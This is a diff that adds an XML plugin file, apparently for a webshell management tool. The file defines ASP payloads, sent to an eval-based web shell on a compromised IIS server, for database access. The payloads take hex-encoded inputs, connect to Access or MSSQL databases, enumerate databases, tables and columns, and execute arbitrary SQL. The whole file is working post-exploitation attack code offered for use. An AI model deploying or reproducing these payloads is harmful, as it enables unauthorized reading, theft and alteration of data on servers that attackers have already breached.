@@ -1,0 +1,96 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<customShellType>
+  <funcCodeSetting>
+	<func>
+      <name>ConnectDb</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/DbManager/access,/DbManager/mssql</path>
+	  <funcParam location="Body" encrymode="Hex" >connStr</funcParam>
+      <item><![CDATA[conStr=hextostr(Request("$connStr$")):Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open conStr:If Err=False Then:Response.Write(1):End If]]></item>
+    </func>
+	<func>
+      <name>GetDbName</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/DbManager/access</path>
+	  <funcParam location="Body" encrymode="Hex" >connStr</funcParam>
+      <item><![CDATA[conStr=hextostr(Request("$connStr$")):Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open conStr:If Err=False Then:Response.Write("mdb"&chr(9)):End If]]></item>
+    </func>
+	<func>
+      <name>GetTableName</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/DbManager/access</path>
+	  <funcParam location="Body" encrymode="Hex" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >dbName</funcParam>
+      <item><![CDATA[conStr=hextostr(Request("$connStr$")):Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open conStr:If Err=False Then:Dim T:Set rs=Conn.OpenSchema(20):If Err=False Then:Do While Not(rs.Eof Or rs.Bof):If rs("TABLE_TYPE")="TABLE" Then:T=T&rs("TABLE_NAME")&chr(9):End If:Rs.MoveNext:Loop:rs.Close:Set rs=Nothing:Conn.Close:Set Conn=Nothing:Response.Write(T):End If:End If]]></item>
+    </func>
+	<func>
+      <name>GetColumnType</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/DbManager/access</path>
+	  <funcParam location="Body" encrymode="Hex" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >columnName</funcParam>
+      <item><![CDATA[Function TN(n):Select Case n:Case 2:TN="smallint":Case 3:TN="int":Case 4:TN="real":Case 5:TN="float":Case 6:TN="money":Case 7:TN="datetime":Case 11:TN="bit":Case 12:TN="variant":Case 16:TN="tinyint":Case 17:TN="tinyint":Case 20:TN="bigint":Case 72:TN="unique":Case 128:TN="binary":Case 129:TN="char":Case 130:TN="nchar":Case 131:TN="numeric":Case 135:TN="datetime":Case 200:TN="varchar":Case 201:TN="text":Case 202:TN="nvarchar":Case 203:TN="ntext":Case 204:TN="varbinary":Case 205:TN="image":Case Else:TN=n:End Select:End Function:conStr=hextostr(Request("$connStr$")):column=hextostr(Request("$columnName$")):Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open conStr:If Err=False Then:Dim T:Set rs=Conn.OpenSchema(4):If Err=False Then:Do While Not(rs.Eof Or rs.Bof):if rs("TABLE_NAME")=column then:T=T&rs("COLUMN_NAME")&"("&TN(rs("DATA_TYPE"))&")"&chr(9):end if:rs.MoveNext:Loop:rs.Close:Set rs=Nothing:Conn.Close:Set Conn=Nothing:Response.Write(T):End If:End If]]></item>
+    </func>
+	<func>
+      <name>ExecuteReader</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/DbManager/access</path>
+	  <funcParam location="Body" encrymode="Hex" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >sqlStr</funcParam>
+      <item><![CDATA[conStr=hextostr(Request("$connStr$")):sqlStr=hextostr(Request("$sqlStr$")):Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open conStr:TA=chr(9)&chr(124)&chr(9):RN=chr(13)&chr(10):If Err=False Then:Dim T:Set Rs=Conn.Execute(sqlStr):If Err=False Then:FN=Rs.Fields.Count-1:For n=0 To FN:col=Rs.Fields(n).Name:If col="" Then:col="column1":End If:Response.Write col&TA:Next:Response.Write RN:Do While Not(Rs.Eof Or Rs.Bof):For n=0 To FN:Response.Write Rs(n)&TA:Next:Response.Write RN:Rs.MoveNext:Loop:Set Rs=Nothing:Conn.Close:Set Conn=Nothing:End If:End If]]></item>
+    </func>
+	<func>
+      <name>ExecuteNonQuery</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/DbManager/access</path>
+	  <funcParam location="Body" encrymode="Hex" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >sqlStr</funcParam>
+      <item><![CDATA[conStr=hextostr(Request("$connStr$")):sqlStr=hextostr(Request("$sqlStr$")):Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open conStr:TA=chr(9)&chr(124)&chr(9):RN=chr(13)&chr(10):If Err=False Then:Dim T,Affected:Conn.Execute sqlStr,Affected:If Err=False Then:Response.Write("Result"&RN&Affected&" rows affected"):Conn.Close:Set Conn=Nothing:End If:End If]]></item>
+    </func>
+    <func>
+      <name>GetDbName</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/DbManager/mssql</path>
+	  <funcParam location="Body" encrymode="Hex" >connStr</funcParam>
+      <item><![CDATA[conStr=hextostr(Request("$connStr$")):Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open conStr:If Err=False Then:Dim T:Set rs=Conn.Execute("select [name] from master.dbo.sysdatabases order by 1"):If Err=False Then:Do While Not(rs.Eof Or rs.Bof):T=T&rs(0)&chr(9):rs.MoveNext:Loop:rs.Close:Set rs=Nothing:Conn.Close:Set Conn=Nothing:Response.Write(T):End If:End If]]></item>
+    </func>
+	<func>
+      <name>GetTableName</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/DbManager/mssql</path>
+	  <funcParam location="Body" encrymode="Hex" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >dbName</funcParam>
+      <item><![CDATA[conStr=hextostr(Request("$connStr$")):db=hextostr(Request("$dbName$")):Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open conStr:If Err=False Then:Dim T:Conn.Execute("USE ["&db&"]"):Set rs=Conn.Execute("SELECT [name] FROM sysobjects WHERE (xtype='U') ORDER BY 1"):If Err=False Then:Do While Not(rs.Eof Or rs.Bof):T=T&rs(0)&chr(9):rs.MoveNext:Loop:rs.Close:Set rs=Nothing:Conn.Close:Set Conn=Nothing:Response.Write(T):End If:End If]]></item>
+    </func>
+	<func>
+      <name>GetColumnType</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/DbManager/mssql</path>
+	  <funcParam location="Body" encrymode="Hex" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >columnName</funcParam>
+      <item><![CDATA[conStr=hextostr(Request("$connStr$")):db=hextostr(Request("$dbName$")):column=hextostr(Request("$columnName$")):Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open conStr:If Err=False Then:Dim T:Conn.Execute("USE ["&db&"]"):Set rs=Conn.Execute("SELECT A.[name],B.[name] FROM syscolumns A,systypes B where A.id=object_id('"&column&"') and A.xtype=B.xtype ORDER BY A.colid"):If Err=False Then:Do While Not(rs.Eof Or rs.Bof):T=T&rs(0)&"("&rs(1)&")"&chr(9)::rs.MoveNext:Loop:rs.Close:Set rs=Nothing:Conn.Close:Set Conn=Nothing:Response.Write(T):End If:End If]]></item>
+    </func>
+	<func>
+      <name>ExecuteReader</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/DbManager/mssql</path>
+	  <funcParam location="Body" encrymode="Hex" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >sqlStr</funcParam>
+      <item><![CDATA[conStr=hextostr(Request("$connStr$")):db=hextostr(Request("$dbName$")):sqlStr=hextostr(Request("$sqlStr$")):Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open conStr:TA=chr(9)&chr(124)&chr(9):RN=chr(13)&chr(10):If Err=False Then:Dim T:Conn.Execute("USE ["&db&"]"):Set Rs=Conn.Execute(sqlStr):If Err=False Then:FN=Rs.Fields.Count-1:For n=0 To FN:col=Rs.Fields(n).Name:If col="" Then:col="column1":End If:Response.Write col&TA:Next:Response.Write RN:Do While Not(Rs.Eof Or Rs.Bof):For n=0 To FN:Response.Write Rs(n)&TA:Next:Response.Write RN:Rs.MoveNext:Loop:Set Rs=Nothing:Conn.Close:Set Conn=Nothing:End If:End If]]></item>
+    </func>
+	<func>
+      <name>ExecuteNonQuery</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/DbManager/mssql</path>
+	  <funcParam location="Body" encrymode="Hex" >connStr</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >dbName</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >sqlStr</funcParam>
+      <item><![CDATA[conStr=hextostr(Request("$connStr$")):db=hextostr(Request("$dbName$")):sqlStr=hextostr(Request("$sqlStr$")):Set Conn=Server.CreateObject("Adodb.connection"):Conn.Open conStr:TA=chr(9)&chr(124)&chr(9):RN=chr(13)&chr(10):If Err=False Then:Dim T,Affected:Conn.Execute("USE ["&db&"]"):Conn.Execute sqlStr,Affected:If Err=False Then:Response.Write("Result"&RN&Affected&" rows affected"):Conn.Close:Set Conn=Nothing:End If:End If]]></item>
+    </func>
+  </funcCodeSetting>
+</customShellType>
